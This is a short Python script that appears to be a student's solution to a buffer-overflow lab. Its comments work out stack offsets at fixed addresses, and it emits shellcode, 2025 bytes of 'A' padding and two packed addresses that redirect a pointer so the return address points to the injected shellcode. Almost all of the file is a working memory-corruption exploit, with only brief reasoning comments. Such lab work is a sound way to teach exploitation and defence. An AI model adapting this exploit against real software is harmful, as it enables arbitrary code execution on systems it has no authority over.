from shellcode import shellcode
from struct import pack
import sys

# shellcode is 23 bytes large

# buf[] (shellcode) will begin at %ebp - 2064
# *p should be at bp - 12
# a should be at bp - 16

# if target2 is anything to go by, the final shellcode address will be ebp - 2087
# NOTE, if 0x808 actually takes up 4 bytes, then shellcode will be at ebp - 2088

# %ebp = 0xfffe7738
# buf[] starts at %ebp - 2064 = 0xfffe6f28
# *p starts at    %ebp - 12   = 0xfffe772c
# a starts at     %ebp - 16   = 0xfffe7728
# buf[]ENDS UP AT %ebp - 2088 = 0xfffe6f10 OR %ebp - 2087 = 0xfffe6f11

# IN TRUTH: the shellcode ended up at 0xfffe6f08 = %ebp - 2096

sys.stdout.buffer.write(shellcode)			# shellcode binary
sys.stdout.buffer.write(b"A"*2025)			# pad buffer with A's
sys.stdout.buffer.write(pack("<I", 0xfffe6f08))	# overwrite a to be addr of shellcode
sys.stdout.buffer.write(pack("<I", 0xfffe773c))	# overwrite *p to be where ret is
